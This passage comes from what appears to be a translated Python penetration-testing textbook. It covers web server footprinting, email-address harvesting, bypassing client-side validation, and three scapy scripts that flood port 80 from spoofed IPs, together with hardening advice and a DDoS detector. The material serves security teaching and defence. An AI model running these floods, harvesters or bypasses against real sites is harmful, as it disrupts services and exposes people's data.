logger = logging.getLogger("honeypot")
logger.setLevel(logging.INFO)
fh = logging.FileHandler("live1.log")
formatter = logging.Formatter('%(levelname)s - %(message)s')
fh.setFormatter(formatter)
logger.addHandler(fh)
```

上面的代码创建了一个日志文件，告诉我们传入请求的客户端地址。

查看`live1.log`文件的输出，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/15541ec1-181d-475c-8b62-f1888ac140d9.jpg)

# 总结

在本章中，您学会了如何发送虚假的 ICMP（ping）回复。为了发送 ICMP 回复，必须运行 ARP 协议。通过同时运行这两个代码，它们在网络层上创建了一种错觉。但是，在运行代码之前，必须设置防火墙以丢弃传出帧。在传输层，进行了两个实验：虚假的端口开放和虚假的操作系统运行。通过更多了解`nmap`，可以创建特定操作系统的准确虚假响应。在应用层，Python Web 服务器代码提供了一个虚假的服务器签名。您可以根据自己的需要更改服务器签名。

在第七章中，*足迹打印 Web 服务器和 Web 应用程序*，您将学习如何足迹打印 Web 服务器。您还将学习如何获取 HTTP 的标头和横幅抓取


# 第七章：足迹定位 Web 服务器和 Web 应用程序

到目前为止，我们已经阅读了与数据链路层到传输层相关的四章内容。现在，我们将转向应用层渗透测试。在本章中，我们将讨论以下主题：

+   足迹定位 Web 服务器的概念

+   引入信息收集

+   HTTP 头检查

+   通过 BeautifulSoup 解析器从 smartwhois.com 获取网站的信息收集

+   网站的横幅抓取

+   Web 服务器的加固

# 足迹定位 Web 服务器的概念

渗透测试的概念不能用单一步骤来解释或执行，因此它被分成了几个步骤。足迹定位是渗透测试的第一步，攻击者试图收集有关目标的信息。在今天的世界中，电子商务正在迅速增长。因此，Web 服务器已成为黑客的主要目标。为了攻击 Web 服务器，我们必须首先了解什么是 Web 服务器。我们还需要了解 Web 服务器托管软件、托管操作系统以及 Web 服务器上运行的应用程序。获取这些信息后，我们可以构建我们的攻击。获取这些信息被称为足迹定位 Web 服务器。

# 引入信息收集

在这一部分，我们将尝试通过使用错误处理技术来获取有关 Web 软件、操作系统和运行在 Web 服务器上的应用程序的信息。从黑客的角度来看，从错误处理中获取信息并不那么有用。然而，从渗透测试人员的角度来看，这非常重要，因为在提交给客户的渗透测试最终报告中，您必须指定错误处理技术。

错误处理背后的逻辑是尝试在 Web 服务器中产生一个返回代码`404`的错误，并查看错误页面的输出。我编写了一个小代码来获取输出。我们将逐行查看以下代码：

```py
import re
import random
import urllib
url1 = raw_input("Enter the URL ")
u = chr(random.randint(97,122))
url2 = url1+u
http_r = urllib.urlopen(url2)

content= http_r.read()flag =0
i=0
list1 = []
a_tag = "<*address>"
file_text = open("result.txt",'a')

while flag ==0:
  if http_r.code == 404:
    file_text.write("--------------")
    file_text.write(url1)
    file_text.write("--------------n")

    file_text.write(content)
    for match in re.finditer(a_tag,content):

      i=i+1
      s= match.start()
      e= match.end()
      list1.append(s)
      list1.append(e)
    if (i>0):
      print "Coding is not good"
    if len(list1)>0:
      a= list1[1]
      b= list1[2]

      print content[a:b]
    else:
      print "error handling seems ok"
    flag =1
  elif http_r.code == 200:
    print "Web page is using custom Error page"
    break
```

我导入了三个模块，`re`、`random`和`urllib`，它们分别负责正则表达式、生成随机数和与 URL 相关的活动。`url1 = raw_input("Enter the URL ")`语句要求输入网站的 URL，并将此 URL 存储在`url1`变量中。然后，`u = chr(random.randint(97,122))`语句创建一个随机字符。下一条语句将此字符添加到 URL 中，并将其存储在`url2`变量中。然后，`http_r = urllib.urlopen(url2)`语句打开`url2`页面，并将此页面存储在`http_r`变量中。`content= http_r.read()`语句将网页的所有内容传输到 content 变量中：

```py
flag =0
i=0
list1 = []
a_tag = "<*address>"
file_text = open("result.txt",'a')
```

上述代码片段定义了`i`变量标志和一个空列表，我们将在后面讨论它的重要性。`a_tag`变量取值为`"<*address>"`。`file_text`变量是一个打开`result.txt`文件的文件对象，以附加模式打开。`result.txt`文件存储了结果。`while flag ==0:`语句表示我们希望`while`循环至少运行一次。`http_r.code`语句从 Web 服务器返回状态代码。如果页面未找到，它将返回`404`代码。

```py
file_text.write("--------------")
file_text.write(url1)
file_text.write("--------------n")

file_text.write(content)
```

上述代码片段将页面的输出写入`result.txt`文件。

`for match in re.finditer(a_tag,content)`:语句找到`a_tag`模式，这意味着错误页面中的`<address>`标签，因为我们对`<address>` `</address>`标签之间的信息感兴趣。`s= match.start()`和`e= match.end()`语句表示`<address>`标签的起点和终点，`list1.append(s)`。`list1.append(e)`语句将这些点存储在列表中，以便以后使用。`i`变量变得大于`0`，这表明错误页面中存在`<address>`标签。这意味着代码不好。`if len(list1)>0`:语句表示如果列表至少有一个元素，则变量`a`和`b`将成为关注点。下图显示了这些关注点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/62de1d49-6b25-4653-a067-899b5f80106a.png)

获取地址标签值

`print content[a:b]`语句读取**a**和**b**点之间的输出，并设置`flag = 1`以终止`while`循环。`elif http_r.code == 200:`语句表示如果 HTTP 状态码为`200`，则将打印`"Web page is using custom Error page"`消息。在这种情况下，如果错误页面返回代码`200`，则意味着错误正在由自定义页面处理。

现在是时候运行输出了，我们将运行两次。

服务器签名打开和关闭时的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/4e36a9eb-7264-4acc-a547-99b18b1d56ab.png)

程序的两个输出

前面的屏幕截图显示了服务器签名打开时的输出。通过查看此输出，我们可以说 Web 软件是 Apache，版本是 2.2.3，操作系统是 Red Hat。在下一个输出中，服务器没有来自服务器的信息，这意味着服务器签名已关闭。有时候，有人使用 Web 应用程序防火墙，例如 mod-security，它会提供一个虚假的服务器签名。在这种情况下，您需要检查`result.txt`文件以获取完整的详细输出。让我们检查`result.txt`的输出，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/7ed8bc70-6e70-48b6-8ea7-d934ac05996e.png)

结果.txt 的输出

当有多个 URL 时，您可以列出所有这些 URL 并将它们提供给程序，这个文件将包含所有 URL 的输出。

# 检查 HTTP 头

通过查看网页的头部，您可以获得相同的输出。有时，服务器错误输出可以通过编程进行更改。但是，检查头部可能会提供大量信息。一小段代码可以给您一些非常详细的信息，如下所示：

```py
import urllib
url1 = raw_input("Enter the URL ")
http_r = urllib.urlopen(url1)
if http_r.code == 200:
  print http_r.headers
```

`print http_r.headers`语句提供了 Web 服务器的头部。

输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/16d61af6-6978-4c44-bbcf-839c5bc0a245.png)

获取头部信息

您会注意到我们从程序中获得了两个输出。在第一个输出中，我们输入了`http://www.juggyboy.com/`作为 URL。程序提供了许多有趣的信息，例如`Server: Microsoft-IIS/6.0`和`X-Powered-By: ASP.NET`；它推断出网站托管在 Windows 机器上，Web 软件是 IIS 6.0，并且 ASP.NET 用于 Web 应用程序编程。

在第二个输出中，我提供了我的本地机器的 IP 地址，即`http://192.168.0.5/`。程序揭示了一些秘密信息，例如 Web 软件是 Apache 2.2.3，运行在 Red Hat 机器上，并且 PHP 5.1 用于 Web 应用程序编程。通过这种方式，您可以获取有关操作系统、Web 服务器软件和 Web 应用程序的信息。

现在，让我们看看如果服务器签名关闭会得到什么输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/497d0456-eb7f-42a2-9c56-93bf1da1758f.png)

当服务器签名关闭时

从前面的输出中，我们可以看到 Apache 正在运行。但是，它既没有显示版本，也没有显示操作系统。对于 Web 应用程序编程，使用了 PHP，但有时输出不会显示编程语言。为此，您必须解析网页以获取任何有用的信息，比如超链接。

如果您想获取标题的详细信息，请打开标题目录，如下面的代码所示：

```py
 >>> import urllib
  >>> http_r = urllib.urlopen("http://192.168.0.5/")
  >>> dir(http_r.headers)
  ['__contains__', '__delitem__', '__doc__', '__getitem__', '__init__', '__iter__', '__len__', 
 '__module__', '__setitem__', '__str__', 'addcontinue', 'addheader', 'dict', 'encodingheader', 'fp', 
 'get',  'getaddr', 'getaddrlist', 'getallmatchingheaders', 'getdate', 'getdate_tz', 'getencoding', 
 'getfirstmatchingheader', 'getheader', 'getheaders', 'getmaintype', 'getparam', 'getparamnames', 
 'getplist', 'getrawheader', 'getsubtype', 'gettype', 'has_key', 'headers', 'iscomment', 'isheader', 
 'islast', 'items', 'keys', 'maintype', 'parseplist', 'parsetype', 'plist', 'plisttext', 'readheaders', 
 'rewindbody', 'seekable', 'setdefault', 'startofbody', 'startofheaders', 'status', 'subtype', 'type', 
 'typeheader', 'unixfrom', 'values']
  >>> 
  >>> http_r.headers.type
  'text/html'
  >>> http_r.headers.typeheader
  'text/html; charset=UTF-8'
 >>>
```

# 从 whois.domaintools.com 获取网站信息

假设您想从网页中获取所有超链接。在这一部分，我们将通过编程来实现这一点。另一方面，也可以通过查看网页源代码来手动完成。但是，那将需要一些时间。

所以让我们来了解一个非常漂亮的解析器叫做 lxml。

让我们看看代码：

+   将使用以下模块：

```py
      from lxml.html import fromstring
      import requests
```

+   当您输入所需的网站时，`request`模块获取网站的数据：

```py
      domain = raw_input("Enter the domain : ")
      url = 'http://whois.domaintools.com/'+domain
      user_agent='wswp'
      headers = {'User-Agent': user_agent}
      resp = requests.get(url, headers=headers)
      html = resp.text
```

+   以下代码片段从网站数据中获取表格：

```py
      tree = fromstring(html)
      ip= tree.xpath('//*[@id="stats"]//table/tbody/tr//text()')
```

+   以下`for`循环从表格数据中删除空格和空字符串：

```py
      list1 = []
      for each in ip:
        each = each.strip()
        if each =="":
          continue
        list1.append(each.strip("\n"))
```

+   以下代码行找到了“IP 地址”字符串的索引：

```py
      ip_index = list1.index('IP Address')
      print "IP address ", list1[ip_index+1]
```

+   接下来的行找到了网站的位置：

```py
      loc1 = list1.index('IP Location')
      loc2 = list1.index('ASN')
      print 'Location : ', "".join(list1[loc1+1:loc2])
```

在前面的代码中，我只打印了网站的 IP 地址和位置。以下输出显示我在三个不同的网站上分别使用了三次该程序：我的学院网站、我的网站和出版商的网站。在这三个输出中，我们得到了 IP 地址和位置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/51ee9d73-67e8-4d9c-9bfa-a59462590424.png)

# 从网页中收集电子邮件地址

在这一部分，我们将学习如何从网页中找到电子邮件地址。为了找到电子邮件地址，我们将使用正则表达式。方法非常简单：首先，从给定的网页获取所有数据，然后使用电子邮件正则表达式来获取电子邮件地址。

让我们看看代码：

```py
import urllib
import re
from bs4 import BeautifulSoup
url = raw_input("Enter the URL ")
ht= urllib.urlopen(url)
html_page = ht.read()
email_pattern=re.compile(r'\b[\w.-]+?@\w+?\.\w+?\b')
for match in re.findall(email_pattern,html_page ):
  print match
```

前面的代码非常简单。`html_page`变量包含了所有的网页数据。`r'\b[\w.-]+?@\w+?\.\w+?\b'`正则表达式表示电子邮件地址。

现在让我们看看输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/951e4517-bfe3-40b6-8c77-d0cd5e690e4d.png)

前面的结果是绝对正确的。给定的 URL 网页是我为测试目的制作的。

# 网站的横幅抓取

在这一部分，我们将抓取网站的 HTTP 横幅。横幅抓取，或者操作系统指纹识别，是一种确定目标 Web 服务器上运行的操作系统的方法。在下面的程序中，我们将嗅探我们计算机上网站的数据包，就像我们在第三章中所做的那样，*嗅探和渗透测试*。

横幅抓取器的代码如下：

```py
import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
while True:

  pkt  = s.recvfrom(2048)
  banner = pkt[0][54:533]
  print banner
  print "--"*40
```

由于您已经阅读了第三章，*嗅探和渗透测试*，您应该对这段代码很熟悉。`banner = pkt[0][54:533]`语句是新的。在`pkt[0][54:]`之前，数据包包含 TCP、IP 和以太网信息。经过一些试验和错误，我发现横幅抓取信息位于`[54:533]`之间。您可以通过取片段`[54:540]`、`[54:545]`、`[54:530]`等进行试验和错误。

要获得输出，您必须在程序运行时在 Web 浏览器中打开网站，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/31b27118-6e4f-4b18-baea-1919aed3d685.png)

横幅抓取

因此，前面的输出显示服务器是 Microsoft-IIS.6.0，使用的编程语言是 ASP.NET。我们得到了与我们在检查标题过程中收到的相同的信息。尝试这段代码，并使用不同的状态代码获取更多信息。

通过使用前面的代码，您可以为自己准备信息收集报告。当我将信息收集方法应用于网站时，我通常会发现客户犯了很多错误。在下一节中，您将看到在 Web 服务器上发现的最常见的错误。

# Web 服务器的加固

在本节中，让我们揭示一些在 Web 服务器上观察到的常见错误。我们还将讨论一些加固 Web 服务器的要点：

+   始终隐藏您的服务器签名。

+   如果可能的话，设置一个虚假的服务器签名来误导攻击者。

+   处理错误。

+   如果可能的话，使用虚拟环境（监禁）来运行应用程序。

+   尽量隐藏编程语言页面扩展名，因为这样攻击者将很难看到 Web 应用程序的编程语言。

+   使用来自供应商的最新补丁更新 Web 服务器。这样可以避免对 Web 服务器的任何利用机会。服务器至少可以针对已知的漏洞进行保护。

+   不要使用第三方补丁来更新 Web 服务器。第三方补丁可能包含木马或病毒。

+   不要在 Web 服务器上安装其他应用程序。如果您安装了操作系统，比如 RHEL 或 Windows，请不要安装其他不必要的软件，比如 Office 或编辑器，因为它们可能包含漏洞。

+   关闭除`80`和`443`之外的所有端口。

+   不要在 Web 服务器上安装任何不必要的编译器，比如 gcc。如果攻击者入侵了 Web 服务器并且想要上传可执行文件，IDS 或 IPS 可以检测到该文件。在这种情况下，攻击者将在 Web 服务器上上传代码文件（以文本文件的形式）并在 Web 服务器上执行该文件。这种执行可能会损坏 Web 服务器。

+   设置活跃用户数量的限制，以防止 DDoS 攻击。

+   在 Web 服务器上启用防火墙。防火墙可以做很多事情，比如关闭端口和过滤流量。

# 总结

在本章中，我们了解了 Web 服务器签名的重要性，并且获得服务器签名是黑客攻击的第一步。

“给我六个小时砍倒一棵树，我将花前四个小时磨斧头。”

- 亚伯拉罕·林肯

在我们的情况下也是一样的。在对 Web 服务器进行攻击之前，最好检查一下它到底运行了哪些服务。这是通过对 Web 服务器进行足迹识别来完成的。错误处理技术是一种被动的过程。头部检查和横幅抓取是主动的过程，用于收集有关 Web 服务器的信息。在本章中，我们还学习了关于 BeautifulSoup 解析器的内容。可以从 BeautifulSoup 中获取超链接、标签和 ID 等部分。在最后一节中，我们介绍了一些加固 Web 服务器的指南。如果您遵循这些指南，您可以使您的 Web 服务器难以受到攻击。

在下一章中，您将学习有关客户端验证和参数篡改的内容。您将学习如何生成和检测 DoS 和 DDOS 攻击。


# 第八章：客户端验证和 DDoS 攻击

在上一章中，您学习了如何解析网页，以及如何从 HTML 页面中获取特定信息。在本章中，我们将讨论以下主题：

+   网页中的验证

+   验证类型

+   验证的渗透测试

+   DoS 攻击

+   DDoS 攻击

+   DDoS 的检测

# 引入客户端验证

通常，当您在 Web 浏览器中访问网页时，您会打开一个表单，填写表单并提交。在填写表单的过程中，某些字段可能有约束条件，例如用户名应该是唯一的；密码应该大于八个字符，并且这些字段不应为空。为此，使用了两种类型的验证，即客户端验证和服务器端验证。诸如 PHP 和 ASP.NET 之类的语言使用服务器端验证，接受输入参数并将其与服务器的数据库进行匹配。

在客户端验证中，验证是在客户端完成的。JavaScript 用于客户端验证。快速响应和易于实现使客户端验证在一定程度上具有益处。然而，频繁使用客户端验证为攻击者提供了一种攻击方式；服务器端验证比客户端验证更安全。普通用户可以看到在 Web 浏览器上发生了什么，但黑客可以看到在 Web 浏览器之外可以做什么。以下图片说明了客户端验证和服务器端验证：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/1114bf29-1c02-4172-a8ab-bc3389b8a5b6.png)

PHP 起到了中间层的作用。它将 HTML 页面连接到 SQL 服务器。

# 使用 Python 篡改客户端参数

最常用的两种方法 POST 和 GET 用于在 HTTP 协议中传递参数。如果网站使用 GET 方法，其传递参数将显示在 URL 中，您可以更改此参数并将其传递给 Web 服务器；这与 POST 方法相反，其中参数不显示在 URL 中。

在本节中，我们将使用一个带有简单 JavaScript 代码的虚拟网站，以及通过 POST 方法传递的参数，并托管在 Apache Web 服务器上。

让我们看一下`index.php`代码：

```py
<html>
<body background="wel.jpg">

  <h1>Leave your Comments </h1>
  <br>
  <form Name="sample" action="submit.php" onsubmit="return validateForm()" method="POST">

    <table-cellpadding="3" cellspacing="4" border="0">
      <tr>
        <td> <font size= 4><b>Your name:</b></font></td>
        <td><input type="text" name="name" rows="10" cols="50"/></td>
      </tr>
      <br><br>

      <tr valign= "top"> <th scope="row"  <p class="req">
        <b><font size= 4>Comments</font> </b> </p> </th>
        <td> <textarea class="formtext" tabindex="4" name="comment" 
         rows="10" cols="50"></textarea></td>
      </tr>

      <tr>
        <td> <input type="Submit" name="submit" value="Submit" /></td>
      </tr>
    </table>
  </form>
  <br>

  <font size= 4 ><a href="dis.php"> Old comments </a> 
  <SCRIPT LANGUAGE="JavaScript">

    <!-- Hide code from non-js browsers

    function validateForm()
    {
      formObj = document.sample;

      if((formObj.name.value.length<1) || 
       (formObj.name.value=="HACKER"))
       {
        alert("Enter your name");
        return false;
      }
      if(formObj.comment.value.length<1)
      {
        alert("Enter your comment.");
        return false;
      }
    }
    // end hiding -->

  </SCRIPT>
</body>
</html>
```

我希望您能理解 HTML、JavaScript 和 PHP 代码。上面的代码显示了一个示例表单，其中包括两个文本提交字段，名称和评论：

```py
if((formObj.name.value.length<1) || (formObj.name.value=="HACKER"))
{
alert("Enter your name");
return false;
}
if(formObj.comment.value.length<1)
{
alert("Enter your comment.");
return false;
}
```

上面的代码显示了验证。如果名称字段为空或填写为`HACKER`，则会显示一个警报框，如果评论字段为空，它将显示一个警报消息，您可以在其中输入您的评论，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/65ffb5a7-a5f8-4094-9d3b-34ceaabdd5a1.png)

验证的警报框

因此，我们在这里的挑战是绕过验证并提交表单。您可能之前使用 Burp 套件做过这个，现在我们将使用 Python 来做这个。

在上一章中，您看到了 BeautifulSoup 工具；现在，我将使用一个名为*mechanize*的 Python 浏览器。mechanize 网络浏览器提供了在网页中获取表单的功能，并且还便于提交输入值。通过使用 mechanize，我们将绕过验证，如下面的代码所示：

```py
import mechanize
br = mechanize.Browser()
br.set_handle_robots( False )
url = raw_input("Enter URL ")
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.open(url)
for form in br.forms():
  print form
```

我们所有的代码片段都以`import`语句开始。因此，在这里，我们正在导入`mechanize`模块。下一行创建了`mechanize`类的`br`对象。`url = raw_input("输入 URL ")`语句要求用户输入。接下来的五行代表了帮助重定向和`robots.txt`处理的浏览器选项。`br.open(url)`语句打开了我们给出的 URL。下一条语句打印了网页中的表单。现在，让我们检查`paratemp.py`程序的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/cb38b115-8782-404d-957e-5c34178514b4.png)

程序输出显示存在两个名称值。第一个是`name`，第二个是`comment`，将传递到操作页面。现在，我们已经收到了参数。让我们看看代码的其余部分：

```py
br.select_form(nr=0)
br.form['name'] = 'HACKER'
br.form['comment'] = ''
br.submit()
```

第一行用于选择表单。在我们的网站中，只有一个表单。`br.form['name'] = 'HACKER'`语句将值`HACKER`填入名称字段，下一行填写空评论，最后一行提交这些值。

现在，让我们从两个方面看输出。代码的输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/6dc1573a-95e1-47d0-b743-1c0b53fc93a9.png)

表单提交

网站的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/0ed254b7-d848-47dd-b292-be4d86a30b15.png)

验证绕过

前面的截图显示已经成功。

现在，你一定已经对如何绕过验证有了一个大致的了解。一般人认为通过`POST`方法发送的参数是安全的。然而，在前面的实验中，你已经看到对于内部网络中的普通用户来说是安全的。如果网站只被内部用户使用，那么客户端验证是一个不错的选择。然而，如果你在电子商务网站上使用客户端验证，那么你只是在邀请攻击者来利用你的网站。在接下来的话题中，你将看到客户端验证对业务的一些不良影响。

# 参数篡改对业务的影响

作为渗透测试人员，你经常需要分析源代码。如今，电子商务领域发展迅速。考虑一个电子商务网站的例子，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/b33fc280-f002-4546-bc22-2559fe84a0e8.png)

网站示例

前面的截图显示`Nokia C7`的价格为`60`，`iPhone 3G`的价格为`600`。你不知道这些价格是来自数据库还是写在网页上。下面的截图显示了这两款手机的价格：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/dbefdd2d-f080-4fe7-8949-f94c836e2293.png)

查看源代码

现在，让我们看一下源代码，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/4f68e78b-f917-4bdf-b7d1-33899a1031f2.png)

看看前面截图中的矩形框。网页上写着价格为`60`，但从数据库中取出的价格是`600`。如果使用`GET`方法，可以通过 URL 篡改来改变价格`60`。价格可以被改成`6`而不是`60`。这将严重影响业务。在白盒测试中，客户会提供给你源代码，你可以分析这段代码，但在黑盒测试中，你必须使用攻击来进行测试。如果使用`POST`方法，可以使用 Mozilla 的附加组件 Tamper Data（[`addons.mozilla.org/en-US/firefox/addon/tamper-data/`](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/)）进行参数篡改。你必须手动操作，所以不需要使用 Python 编程。

# 介绍 DoS 和 DDoS

在本节中，我们将讨论最致命的攻击之一，称为拒绝服务攻击。这种攻击的目的是消耗机器或网络资源，使其对预期用户不可用。一般来说，攻击者在其他攻击失败时使用这种攻击。这种攻击可以在数据链路、网络或应用层进行。通常，Web 服务器是黑客的目标。在 DoS 攻击中，攻击者向 Web 服务器发送大量请求，旨在消耗网络带宽和机器内存。在**分布式拒绝服务**（**DDoS**）攻击中，攻击者从不同的 IP 地址发送大量请求。为了进行 DDoS 攻击，攻击者可以使用特洛伦或 IP 欺骗。在本节中，我们将进行各种实验来完成我们的报告。

# 单个 IP，单个端口

在这次攻击中，我们使用单个 IP（可能是伪造的）和单个源端口号向 Web 服务器发送大量数据包。这是一种非常低级的 DoS 攻击，将测试 Web 服务器的请求处理能力。

以下是`sisp.py`的代码：

```py
from scapy.all import *
src = raw_input("Enter the Source IP ")
target = raw_input("Enter the Target IP ")
srcport = int(raw_input("Enter the Source Port "))
i=1
while True: 
  IP1 = IP(src=src, dst=target)
  TCP1 = TCP(sport=srcport, dport=80)
  pkt = IP1 / TCP1
  send(pkt,inter= .001)
  print "packet sent ", i
  i=i+1
```

我用 scapy 编写了这段代码，希望你熟悉。上面的代码要求三样东西：源 IP 地址、目标 IP 地址和源端口地址。

让我们检查攻击者机器上的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/9f703009-3f39-4ce3-bf68-e2900bcb5957.png)

单个 IP，单个端口

我使用了伪造的 IP 来隐藏我的身份。你需要发送大量数据包来检查 Web 服务器的行为。在攻击期间，尝试打开托管在 Web 服务器上的网站。无论是否成功，都要把你的发现写入报告。

让我们检查服务器端的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/70b97414-fd0f-446c-9b49-a4fe423bc6c6.png)

服务器上的 Wireshark 输出

这个输出显示我们的数据包成功发送到了服务器。用不同的序列号重复这个程序。

# 单个 IP，多个端口

现在，在这次攻击中，我们使用单个 IP 地址但是多个端口。

在这里，我写了`simp.py`程序的代码：

```py
from scapy.all import *

src = raw_input("Enter the Source IP ")
target = raw_input("Enter the Target IP ")

i=1
while True: 
  for srcport in range(1,65535): 
    IP1 = IP(src=src, dst=target)
    TCP1 = TCP(sport=srcport, dport=80)
    pkt = IP1 / TCP1
    send(pkt,inter= .0001)
    print "packet sent ", i
    i=i+1
```

我在端口上使用了`for`循环。让我们检查攻击者的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/d28dba77-5745-43db-a692-8d72108dd2f2.png)

来自攻击者机器的数据包

上面的截图显示数据包成功发送。现在，检查目标机器上的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/e8efc7b0-36cc-48fa-8613-3ad99b1fe37d.png)

出现在目标机器上的数据包

在上面的截图中，矩形框显示了端口号。我会让你创建单个端口的多个 IP 地址。

# 多个 IP，多个端口

在这一部分，我们将讨论多个 IP 和多个端口地址。在这次攻击中，我们使用不同的 IP 发送数据包到目标。多个 IP 代表伪造的 IP。下面的程序将从伪造的 IP 发送大量数据包：

```py
import random
from scapy.all import *
target = raw_input("Enter the Target IP ")

i=1
while True: 
  a = str(random.randint(1,254))
  b = str(random.randint(1,254))
  c = str(random.randint(1,254))
  d = str(random.randint(1,254))
  dot = "."
  src = a+dot+b+dot+c+dot+d
  print src
  st = random.randint(1,1000)
  en = random.randint(1000,65535)
  loop_break = 0
  for srcport in range(st,en): 
    IP1 = IP(src=src, dst=target)
    TCP1 = TCP(sport=srcport, dport=80)
    pkt = IP1 / TCP1
    send(pkt,inter= .0001)
    print "packet sent ", i
    loop_break = loop_break+1
    i=i+1
    if loop_break ==50 :
      break
```

在上面的代码中，我们使用`a`、`b`、`c`和`d`变量来存储四个随机字符串，范围从`1`到`254`。`src`变量存储随机 IP 地址。在这里，我们使用`loop_break`变量来在`50`个数据包后中断`for`循环。这意味着 50 个数据包来自一个 IP，而其余的代码和之前的一样。

让我们检查`mimp.py`程序的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/381dff7b-35b4-42b5-90d3-fc0731cbaf48.png)

多个 IP，多个端口

在上面的截图中，你可以看到在第 50 个数据包后，IP 地址发生了变化。

让我们检查目标机器上的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/12c21c02-c40e-4f63-a828-3e1f185a1840.png)

目标机器上 Wireshark 的输出

使用多台机器执行这段代码。在上面的截图中，你可以看到机器回复了源 IP。这种类型的攻击很难检测，因为很难区分数据包是来自有效主机还是伪造主机。

# DDoS 攻击检测

当我攻读工程硕士学位时，我和朋友一起研究 DDoS 攻击。这是一种非常严重的攻击，很难检测，几乎不可能猜测流量是来自伪造主机还是真实主机。在 DoS 攻击中，流量只来自一个来源，所以我们可以阻止那个特定的主机。基于某些假设，我们可以制定规则来检测 DDoS 攻击。如果 Web 服务器只运行包含端口 80 的流量，那就应该允许。现在，让我们来看一个非常简单的检测 DDoS 攻击的代码。程序的名字是`DDOS_detect1.py`：

```py
import socket
import struct
from datetime import datetime
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
dict = {}
file_txt = open("dos.txt",'a')
file_txt.writelines("**********")
t1= str(datetime.now())
file_txt.writelines(t1)
file_txt.writelines("**********")
file_txt.writelines("n")
print "Detection Start ......."
D_val =10
D_val1 = D_val+10
while True:

  pkt  = s.recvfrom(2048)
  ipheader = pkt[0][14:34]
  ip_hdr = struct.unpack("!8sB3s4s4s",ipheader)
  IP = socket.inet_ntoa(ip_hdr[3])
  print "Source IP", IP
  if dict.has_key(IP):
    dict[IP]=dict[IP]+1
    print dict[IP]
    if(dict[IP]>D_val) and (dict[IP]<D_val1) :

      line = "DDOS Detected "
      file_txt.writelines(line)
      file_txt.writelines(IP)
      file_txt.writelines("n")

  else:
  dict[IP]=1
```

在第三章中，*嗅探和渗透测试*，您了解了嗅探器。在前面的代码中，我们使用嗅探器获取数据包的源 IP 地址。`file_txt = open("dos.txt",'a')`语句以追加模式打开文件，这个`dos.txt`文件用作检测 DDoS 攻击的日志文件。每当程序运行时，`file_txt.writelines(t1)`语句会写入当前时间。`D_val =10`变量只是为了演示程序而假设的。这个假设是通过查看来自特定 IP 的点击统计数据得出的。考虑一个教程网站的情况。来自学校和学院的 IP 的点击量会更多。如果来自新 IP 的请求数量很大，那么可能是 DoS 的情况。如果来自一个 IP 的入站数据包计数超过了`D_val`变量，那么该 IP 被认为是 DDoS 攻击的责任。`D_val1`变量将在代码中稍后使用以避免冗余。我希望在`if dict.has_key(IP):`语句之前您对代码很熟悉。这个语句将检查字典中是否存在键（IP 地址）。如果键存在于`dict`中，那么`dict[IP]=dict[IP]+1`语句将增加`dict[IP]`的值，这意味着`dict[IP]`包含来自特定 IP 的数据包计数。`if(dict[IP]>D_val)`和`(dict[IP]<D_val1)`：语句是检测和将结果写入`dos.txt`文件的标准；`if(dict[IP]>D_val)`检测入站数据包的计数是否超过了`D_val`的值。如果超过了，随后的语句将在获取新数据包后将 IP 写入`dos.txt`。为了避免冗余，使用了`(dict[IP]<D_val1)`语句。接下来的语句将在`dos.txt`文件中写入结果。

在服务器上运行程序，并在攻击者的机器上运行`mimp.py`。

以下屏幕截图显示了`dos.txt`文件。看看那个文件。它写了一个 IP 九次，就像我们提到的`D_val1 = D_val+10`。您可以更改`D_val`的值来设置特定 IP 发出的请求次数。这取决于网站的旧统计数据。我希望前面的代码对研究目的有用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/6b6f3aff-d07f-4c2f-ac83-7a22b8944046.png)

检测 DDoS 攻击

如果您是安全研究人员，前面的程序对您应该是有用的。您可以修改代码，使得只有包含端口 80 的数据包才会被允许。

# 总结

